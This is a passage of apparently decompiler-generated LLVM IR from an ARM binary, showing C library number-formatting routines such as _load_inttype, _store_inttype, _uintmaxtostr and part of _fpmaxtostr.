  %v3_2c7c4 = zext i16 %v2_2c7c4 to i32
  %v1_2c7c8 = or i16 %v2_2c7c4, 64
  %v1_2c7cc = and i32 %v3_2c7c4, 2816
  store i32 %v1_2c7cc, i32* %r0.global-to-local, align 4
  %v2_2c7cc = icmp eq i32 %v1_2c7cc, 0
  store i16 %v1_2c7c8, i16* %v1_2c7c4, align 2
  br i1 %v2_2c7cc, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_2c7c4
  %v1_2c7d4 = load i32, i32* @r4, align 4
  %v2_2c7d4 = add i32 %v1_2c7d4, 12
  %v3_2c7d4 = inttoptr i32 %v2_2c7d4 to i32*
  %v4_2c7d4 = load i32, i32* %v3_2c7d4, align 4
  %v3_2c7d8 = add i32 %v1_2c7d4, 28
  %v4_2c7d8 = inttoptr i32 %v3_2c7d8 to i32*
  store i32 %v4_2c7d4, i32* %v4_2c7d8, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_2c7c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_2c754, %.thread1
  %v2_2c7e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2c7e0, i32* @r4, align 4
  %v1_2c7e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2c7e4

; uselistorder directives
  uselistorder i32 %v2_2c7b4, { 1, 0 }
  uselistorder i32 %v0_2c778, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_2c71c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c7c4, { 1, 0 }
  uselistorder label %dec_label_pc_2c7a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2c790, { 1, 0 }
  uselistorder label %dec_label_pc_2c748, { 1, 0 }
  uselistorder label %dec_label_pc_2c73c, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_2c7e8 = load i32, i32* @r2, align 4
  %v1_2c7e8 = icmp slt i32 %v0_2c7e8, 0
  %v0_2c7ec = load i32, i32* @r0, align 4
  %v1_2c7f0 = and i32 %v0_2c7ec, 2048
  %v2_2c824 = icmp eq i32 %v1_2c7f0, 0
  br i1 %v1_2c7e8, label %dec_label_pc_2c824, label %dec_label_pc_2c7f8

dec_label_pc_2c7f8:                               ; preds = %entry
  br i1 %v2_2c824, label %dec_label_pc_2c800, label %dec_label_pc_2c82c

dec_label_pc_2c800:                               ; preds = %dec_label_pc_2c7f8
  %v7_2c800 = icmp eq i32 %v0_2c7ec, 256
  %v0_2c804 = load i32, i32* @r1, align 4
  %v1_2c804 = inttoptr i32 %v0_2c804 to i32*
  %v2_2c804 = load i32, i32* %v1_2c804, align 4
  %v2_2c808 = urem i32 %v2_2c804, 256
  %v2_2c808.v2_2c804 = select i1 %v7_2c800, i32 %v2_2c808, i32 %v2_2c804
  br i1 %v7_2c800, label %.thread, label %dec_label_pc_2c810

dec_label_pc_2c810:                               ; preds = %dec_label_pc_2c800
  %v7_2c810 = icmp eq i32 %v0_2c7ec, 512
  br i1 %v7_2c810, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2c810
  %v4_2c818 = urem i32 %v2_2c808.v2_2c804, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2c810, %dec_label_pc_2c800, %bb
  %v1_2c820 = phi i32 [ %v2_2c804, %dec_label_pc_2c810 ], [ %v2_2c808, %dec_label_pc_2c800 ], [ %v4_2c818, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_2c820

dec_label_pc_2c824:                               ; preds = %entry
  br i1 %v2_2c824, label %dec_label_pc_2c834, label %dec_label_pc_2c82c

dec_label_pc_2c82c:                               ; preds = %dec_label_pc_2c7f8, %dec_label_pc_2c824
  %v0_2c82c = load i32, i32* @r1, align 4
  %v1_2c82c = inttoptr i32 %v0_2c82c to i32*
  %v2_2c82c = load i32, i32* %v1_2c82c, align 4
  %v3_2c82c = add i32 %v0_2c82c, 4
  %v4_2c82c = inttoptr i32 %v3_2c82c to i32*
  %v5_2c82c = load i32, i32* %v4_2c82c, align 4
  store i32 %v5_2c82c, i32* @r1, align 4
  ret i32 %v2_2c82c

dec_label_pc_2c834:                               ; preds = %dec_label_pc_2c824
  %v7_2c834 = icmp eq i32 %v0_2c7ec, 256
  %v0_2c838 = load i32, i32* @r1, align 4
  %v1_2c838 = inttoptr i32 %v0_2c838 to i32*
  %v2_2c838 = load i32, i32* %v1_2c838, align 4
  %v2_2c83c = urem i32 %v2_2c838, 256
  %v2_2c83c.v2_2c838 = select i1 %v7_2c834, i32 %v2_2c83c, i32 %v2_2c838
  br i1 %v7_2c834, label %.thread2, label %dec_label_pc_2c844

dec_label_pc_2c844:                               ; preds = %dec_label_pc_2c834
  %v7_2c844 = icmp eq i32 %v0_2c7ec, 512
  br i1 %v7_2c844, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_2c844
  %v4_2c848 = mul i32 %v2_2c83c.v2_2c838, 65536
  %v4_2c84c = sdiv i32 %v4_2c848, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2c844, %dec_label_pc_2c834, %bb5
  %v0_2c850 = phi i32 [ %v2_2c838, %dec_label_pc_2c844 ], [ %v2_2c83c, %dec_label_pc_2c834 ], [ %v4_2c84c, %bb5 ]
  %v3_2c850 = ashr i32 %v0_2c850, 31
  store i32 %v3_2c850, i32* @r1, align 4
  ret i32 %v0_2c850

; uselistorder directives
  uselistorder i32 %v0_2c850, { 1, 0 }
  uselistorder i32 %v2_2c83c, { 1, 0 }
  uselistorder i32 %v2_2c838, { 1, 2, 0 }
  uselistorder i32 %v2_2c808, { 1, 0 }
  uselistorder i32 %v2_2c804, { 1, 2, 0 }
  uselistorder i1 %v2_2c824, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c82c, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_2c858 = icmp eq i32 %arg2, 256
  store i1 %v7_2c858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c858, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_2c85c = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_2c85c, i8* %tmp3, align 1
  %v1_2c860.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_2c860 = phi i1 [ false, %entry ], [ %v1_2c860.pre, %bb ]
  %v0_2c860 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_2c860, i32 %v0_2c860)
  %v7_2c864 = icmp eq i32 %arg2, 2048
  store i1 %v7_2c864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c864, label %dec_label_pc_2c86c, label %dec_label_pc_2c874

dec_label_pc_2c86c:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_2c86c = add i32 %tmp2, 4
  %v6_2c86c = inttoptr i32 %v5_2c86c to i32*
  store i32 %arg4, i32* %v6_2c86c, align 4
  ret i32 %tmp2

dec_label_pc_2c874:                               ; preds = %bb4
  %v7_2c874 = icmp eq i32 %arg2, 512
  store i1 %v7_2c874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c874, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_2c874
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_2c874
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 2, 0, 3, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_2c890 = icmp slt i32 %tmp21, 0
  %v2_2c890 = icmp eq i32 %tmp21, 0
  store i1 %v2_2c890, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_2c898 = load i32, i32* @r2, align 4
  store i32 %v0_2c898, i32* %r5.global-to-local, align 4
  %v0_2c89c = load i32, i32* @r3, align 4
  store i32 %v0_2c89c, i32* %r6.global-to-local, align 4
  br i1 %v1_2c890, label %dec_label_pc_2c8a4, label %dec_label_pc_2c8c4

dec_label_pc_2c8a4:                               ; preds = %entry
  %v1_2c8a4 = icmp slt i32 %v0_2c89c, 0
  %v2_2c8a4 = icmp eq i32 %v0_2c89c, 0
  store i1 %v2_2c8a4, i1* %cpsr_z.global-to-local, align 1
  %v1_2c8a8 = sub i32 0, %tmp21
  store i32 %v1_2c8a8, i32* %r7.global-to-local, align 4
  br i1 %v1_2c8a4, label %dec_label_pc_2c8b0, label %dec_label_pc_2c8c4

dec_label_pc_2c8b0:                               ; preds = %dec_label_pc_2c8a4
  %v1_2c8b4 = sub i32 0, %v0_2c898
  store i32 %v1_2c8b4, i32* %r5.global-to-local, align 4
  %v2_2c8b4 = icmp eq i32 %v0_2c898, 0
  %v2_2c8b8 = icmp eq i1 %v2_2c8b4, false
  %v5_2c8b8 = sext i1 %v2_2c8b8 to i32
  %v6_2c8b8 = sub i32 %v5_2c8b8, %v0_2c89c
  store i32 %v6_2c8b8, i32* %r6.global-to-local, align 4
  %v19_2c8b8 = icmp eq i32 %v6_2c8b8, 0
  store i1 %v19_2c8b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2c8cc

dec_label_pc_2c8c4:                               ; preds = %dec_label_pc_2c8a4, %entry
  br label %dec_label_pc_2c8cc

dec_label_pc_2c8cc:                               ; preds = %dec_label_pc_2c8b0, %dec_label_pc_2c8c4
  %storemerge = phi i8 [ 0, %dec_label_pc_2c8c4 ], [ 1, %dec_label_pc_2c8b0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_2c8d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_2c8dc = udiv i32 -1, %v0_2c8d4
  store i32 %v2_2c8dc, i32* %fp.global-to-local, align 4
  %v3_2c8ec = urem i32 -1, %v0_2c8d4
  %v1_2c8f0 = add i32 %v3_2c8ec, 1
  store i32 %v1_2c8f0, i32* %sb.global-to-local, align 4
  %v9_2c8f4 = icmp eq i32 %v1_2c8f0, %v0_2c8d4
  store i1 %v9_2c8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2c8f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2c8cc
  %v1_2c8f8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_2c8f8, i32* %sb.global-to-local, align 4
  %v2_2c8fc = add i32 %v2_2c8dc, 1
  store i32 %v2_2c8fc, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2c8cc, %bb
  %v0_2c900 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2c900, i32* %sl.global-to-local, align 4
  %v0_2c904 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2c904, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2c908

dec_label_pc_2c908thread-pre-split:               ; preds = %bb25
  %v0_2c908.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_2c90c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_2c910.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2c908

dec_label_pc_2c908:                               ; preds = %dec_label_pc_2c908thread-pre-split, %.thread
  %v0_2c98c = phi i32 [ %v0_2c910.pre, %dec_label_pc_2c908thread-pre-split ], [ %v0_2c8d4, %.thread ]
  %v0_2c984 = phi i32 [ %v0_2c90c.pre, %dec_label_pc_2c908thread-pre-split ], [ %v0_2c904, %.thread ]
  %v0_2c920 = phi i32 [ %v0_2c908.pr, %dec_label_pc_2c908thread-pre-split ], [ %v0_2c900, %.thread ]
  %v2_2c908 = icmp eq i32 %v0_2c920, 0
  store i1 %v2_2c908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c908, label %dec_label_pc_2c980, label %dec_label_pc_2c918

dec_label_pc_2c918:                               ; preds = %dec_label_pc_2c908
  %v2_2c91c = udiv i32 %v0_2c920, %v0_2c98c
  %v3_2c91c = urem i32 %v0_2c920, %v0_2c98c
  store i32 %v2_2c91c, i32* %sl.global-to-local, align 4
  %v2_2c93c = udiv i32 %v0_2c984, %v0_2c98c
  %v3_2c93c = urem i32 %v0_2c984, %v0_2c98c
  %v0_2c940 = load i32, i32* %sb.global-to-local, align 4
  %v2_2c940 = mul i32 %v0_2c940, %v3_2c91c
  %v2_2c948 = add i32 %v2_2c940, %v3_2c93c
  store i32 %v2_2c948, i32* %r5.global-to-local, align 4
  %v0_2c954 = load i32, i32* %fp.global-to-local, align 4
  %v2_2c954 = mul i32 %v0_2c954, %v3_2c91c
  %v2_2c95c = add i32 %v2_2c954, %v2_2c93c
  %v2_2c964 = udiv i32 %v2_2c948, %v0_2c98c
  %v2_2c96c = add i32 %v2_2c95c, %v2_2c964
  br label %dec_label_pc_2c998

dec_label_pc_2c980:                               ; preds = %dec_label_pc_2c908
  %v2_2c980 = udiv i32 %v0_2c984, %v0_2c98c
  br label %dec_label_pc_2c998

dec_label_pc_2c998:                               ; preds = %dec_label_pc_2c918, %dec_label_pc_2c980
  %storemerge28 = phi i32 [ %v2_2c980, %dec_label_pc_2c980 ], [ %v2_2c96c, %dec_label_pc_2c918 ]
  %v0_2c9b4 = phi i32 [ %v2_2c980, %dec_label_pc_2c980 ], [ %v2_2c96c, %dec_label_pc_2c918 ]
  %v1_2c9b4 = phi i32 [ 0, %dec_label_pc_2c980 ], [ %v2_2c91c, %dec_label_pc_2c918 ]
  %v2_2c948.pn = phi i32 [ %v0_2c984, %dec_label_pc_2c980 ], [ %v2_2c948, %dec_label_pc_2c918 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_2c9a0 = urem i32 %v2_2c948.pn, %v0_2c98c
  %v2_2c99c = icmp ugt i32 %v0_2c9a0, 8
  %v7_2c99c = icmp eq i32 %v0_2c9a0, 9
  store i1 %v7_2c99c, i1* %cpsr_z.global-to-local, align 1
  %v1_2c9a4 = add i32 %v0_2c9a0, 48
  %v0_2c9ac = load i32, i32* %r8.global-to-local, align 4
  %v1_2c9ac = add i32 %v0_2c9ac, -1
  store i32 %v1_2c9ac, i32* %r8.global-to-local, align 4
  %v2_2c9b0 = xor i1 %v7_2c99c, true
  %v3_2c9b0 = and i1 %v2_2c99c, %v2_2c9b0
  %extract.t = trunc i32 %v1_2c9a4 to i8
  br i1 %v3_2c9b0, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_2c998
  %v2_2c9a0 = add i32 %v0_2c9a0, %tmp11
  %extract.t9 = trunc i32 %v2_2c9a0 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_2c998, %bb24
  %v0_2c9b8.off0 = phi i8 [ %extract.t, %dec_label_pc_2c998 ], [ %extract.t9, %bb24 ]
  %v2_2c9b4 = or i32 %v0_2c9b4, %v1_2c9b4
  %v4_2c9b4 = icmp eq i32 %v2_2c9b4, 0
  store i1 %v4_2c9b4, i1* %cpsr_z.global-to-local, align 1
  %v3_2c9b8 = inttoptr i32 %v1_2c9ac to i8*
  store i8 %v0_2c9b8.off0, i8* %v3_2c9b8, align 1
  %v0_2c9bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2c9bc, label %dec_label_pc_2c9c0, label %dec_label_pc_2c908thread-pre-split

dec_label_pc_2c9c0:                               ; preds = %bb25
  %v4_2c9c010 = zext i8 %storemerge to i32
  store i32 %v4_2c9c010, i32* @r3, align 4
  %v2_2c9c4 = icmp eq i8 %storemerge, 0
  store i1 %v2_2c9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c9c4, label %dec_label_pc_2c9c0..thread2_crit_edge, label %bb26

dec_label_pc_2c9c0..thread2_crit_edge:            ; preds = %dec_label_pc_2c9c0
  %v0_2c9d0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_2c9c0
  store i32 45, i32* @r3, align 4
  %v3_2c9cc = load i32, i32* %r8.global-to-local, align 4
  %v4_2c9cc = add i32 %v3_2c9cc, -1
  %v5_2c9cc = inttoptr i32 %v4_2c9cc to i8*
  store i8 45, i8* %v5_2c9cc, align 1
  %v6_2c9cc = load i32, i32* %r8.global-to-local, align 4
  %v7_2c9cc = add i32 %v6_2c9cc, -1
  store i32 %v7_2c9cc, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2c9c0..thread2_crit_edge, %bb26
  %v0_2c9d0 = phi i32 [ %v0_2c9d0.pre, %dec_label_pc_2c9c0..thread2_crit_edge ], [ %v7_2c9cc, %bb26 ]
  ret i32 %v0_2c9d0

; uselistorder directives
  uselistorder i32 %v0_2c9a0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2c98c, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_2c898, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 9, 7, 13, 14, 15, 16, 17, 18, 8, 0, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 10, 42, 43, 44, 11, 45, 12, 46, 47, 48, 50, 51, 52, 49, 54, 55, 56, 53, 57, 58, 59, 60, 61, 3, 2, 4, 5, 6, 62, 63, 64 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_2c998, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_2c8cc, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_2c9e0 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_2c9ec = add i32 %arg4, 8
  %v2_2c9ec = inttoptr i32 %v1_2c9ec to i8*
  %v3_2c9ec = load i8, i8* %v2_2c9ec, align 1
  %v4_2c9ec = zext i8 %v3_2c9ec to i32
  store i32 %v4_2c9ec, i32* %sb.global-to-local, align 4
  %v1_2c9f0 = or i32 %v4_2c9ec, 32
  %v7_2c9f4 = icmp eq i32 %v1_2c9f0, 97
  store i1 %v7_2c9f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_2ca0c = inttoptr i32 %arg4 to i32*
  %v2_2ca0c = load i32, i32* %v1_2ca0c, align 4
  store i32 %v2_2ca0c, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_2ca14 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_2ca14, i32* %r6.global-to-local, align 4
  store i32 98128, i32* %ip.global-to-local, align 4
  br i1 %v7_2c9f4, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_2ca1c = add nuw nsw i32 %v4_2c9ec, 6
  store i32 %v2_2ca1c, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_2ca2c = phi i32 [ %v0_2ca14, %entry ], [ %v2_2ca1c, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_2ca24 = add i32 %arg4, 12
  %v2_2ca24 = inttoptr i32 %v1_2ca24 to i32*
  %v3_2ca24 = load i32, i32* %v2_2ca24, align 4
  store i32 %v3_2ca24, i32* %r2.global-to-local, align 4
  %v1_2ca28 = add i32 %arg4, 4
  %v2_2ca28 = inttoptr i32 %v1_2ca28 to i32*
  %v3_2ca28 = load i32, i32* %v2_2ca28, align 4
  store i32 %v3_2ca28, i32* @lr, align 4
  br i1 %v7_2c9f4, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_2ca2c = urem i32 %v1_2ca2c, 256
  store i32 %v2_2ca2c, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_2ca30 = icmp slt i32 %v2_2ca0c, 0
  %v2_2ca30 = icmp eq i32 %v2_2ca0c, 0
  store i1 %v2_2ca30, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_2ca30, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_2ca40 = and i32 %v3_2ca24, 2
  %v2_2ca40 = icmp eq i32 %v1_2ca40, 0
  store i1 %v2_2ca40, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_2ca40, label %dec_label_pc_2ca58, label %dec_label_pc_2ca64

dec_label_pc_2ca58:                               ; preds = %bb205
  %v1_2ca58 = urem i32 %v3_2ca24, 2
  %v2_2ca58 = icmp eq i32 %v1_2ca58, 0
  store i1 %v2_2ca58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ca58, label %dec_label_pc_2ca68, label %dec_label_pc_2ca64

dec_label_pc_2ca64:                               ; preds = %dec_label_pc_2ca58, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_2ca58 ]
  %v0_2ca64.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_2ca58 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_2ca64.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_2ca68

dec_label_pc_2ca68:                               ; preds = %dec_label_pc_2ca58, %dec_label_pc_2ca64
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_2ca14, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_2ca14, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_2ca84 = fptrunc double %arg2 to float
  %v2_2ca84 = bitcast float %v1_2ca84 to i32
  %v9_2ca84 = call i32 @__aeabi_dcmpeq(i32 %v2_2ca84, i32 %v0_2ca14, i32 %v2_2ca84, i32 %v0_2ca14, i32 0)
  store i32 %v9_2ca84, i32* %r0.global-to-local, align 4
  %v2_2ca88 = icmp eq i32 %v9_2ca84, 0
  store i1 %v2_2ca88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ca88, label %bb207, label %dec_label_pc_2ca98

bb207:                                            ; preds = %dec_label_pc_2ca68
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2cb4c

dec_label_pc_2ca98:                               ; preds = %dec_label_pc_2ca68
  %v0_2ca98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2ca98, i32* @r0, align 4
  %v0_2ca9c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2ca9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_2caa8 = call i32 @__aeabi_dcmpeq(i32 %v0_2ca98, i32 %v0_2ca9c, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_2caa8, i32* %r0.global-to-local, align 4
  %v2_2caac = icmp eq i32 %v7_2caa8, 0
  store i1 %v2_2caac, i1* %cpsr_z.global-to-local, align 1
  %v0_2caf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_2caf4 = sext i32 %v0_2caf4 to i64
  %v2_2caf4 = bitcast i64 %v1_2caf4 to double
  br i1 %v2_2caac, label %dec_label_pc_2caf4, label %dec_label_pc_2cab4

dec_label_pc_2cab4:                               ; preds = %dec_label_pc_2ca98
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_2cac4 = fdiv double 0.000000e+00, %v2_2caf4
  %v10_2cac4 = fptrunc double %v9_2cac4 to float
  %v11_2cac4 = bitcast float %v10_2cac4 to i32
  store i32 %v11_2cac4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_2cad0 = call i32 @__aeabi_dcmplt(i32 %v11_2cac4, i32 1072693248, i32 0, i32 0)
  store i32 %v4_2cad0, i32* %r0.global-to-local, align 4
  %v2_2cad4 = icmp eq i32 %v4_2cad0, 0
  store i1 %v2_2cad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cad4, label %bb208, label %dec_label_pc_2cae0

bb208:                                            ; preds = %dec_label_pc_2cab4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2ccc0

dec_label_pc_2cae0:                               ; preds = %dec_label_pc_2cab4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_2ccc0

dec_label_pc_2caf4:                               ; preds = %dec_label_pc_2ca98
  store i32 %v0_2caf4, i32* @r0, align 4
  %v0_2caf8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2caf8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2cb04 = fptrunc double %v2_2caf4 to float
  %v2_2cb04 = bitcast float %v1_2cb04 to i32
  %v6_2cb04 = call i32 @__aeabi_dcmplt(i32 %v2_2cb04, i32 %v0_2caf8, i32 0, i32 0)
  store i32 %v6_2cb04, i32* %r0.global-to-local, align 4
  %v2_2cb08 = icmp eq i32 %v6_2cb04, 0
  store i1 %v2_2cb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2cb08, label %dec_label_pc_2caf4..thread9_crit_edge, label %bb209

dec_label_pc_2caf4..thread9_crit_edge:            ; preds = %dec_label_pc_2caf4
  %v0_2cb28.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_2caf4
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_2cb10 = load i32, i32* %r6.global-to-local, align 4
  %v2_2cb10 = sub i32 0, %v1_2cb10
  store i32 %v2_2cb10, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_2cb10, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_2caf4..thread9_crit_edge, %bb209
